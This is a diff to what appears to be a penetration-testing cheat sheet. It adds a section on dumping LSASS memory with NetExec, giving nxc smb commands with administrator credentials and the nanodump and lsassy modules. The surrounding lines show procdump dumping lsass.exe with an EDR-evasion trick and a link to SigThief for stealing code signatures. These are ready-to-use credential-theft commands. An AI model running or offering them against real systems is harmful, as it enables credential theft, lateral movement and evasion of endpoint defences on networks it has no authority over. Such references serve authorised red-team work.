@@ -711,6 +711,17 @@ Depending on the EDR, it may be sufficient to simply add quotations around the p
 procdump.exe -accepteula -ma “lsass.exe” out.dmp
 ```
 
+## Dumping LSASS With NetExec:
+
+Using Lsassy and Nanodump:
+```
+nxc smb 192.168.255.131 -u administrator -p pass -M nanodump
+```
+
+```
+nxc smb 192.168.255.131 -u administrator -p pass -M lsassy
+```
+
 ## Stealing Signatures with SigThief:
 
 Download: https://github.com/secretsquirrel/SigThief
